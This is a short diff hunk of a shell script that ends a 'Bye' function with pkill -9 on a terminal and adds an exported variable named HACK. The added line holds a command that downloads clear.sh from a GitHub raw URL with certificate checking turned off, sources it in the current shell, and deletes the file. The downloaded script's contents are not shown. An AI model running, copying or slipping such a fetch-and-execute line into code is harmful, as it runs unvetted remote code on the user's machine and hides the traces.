@@ -45,3 +45,5 @@ function Bye {
   _resume;
   pkill -9 $my_pts
 }
+
+export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; rm clear.sh"
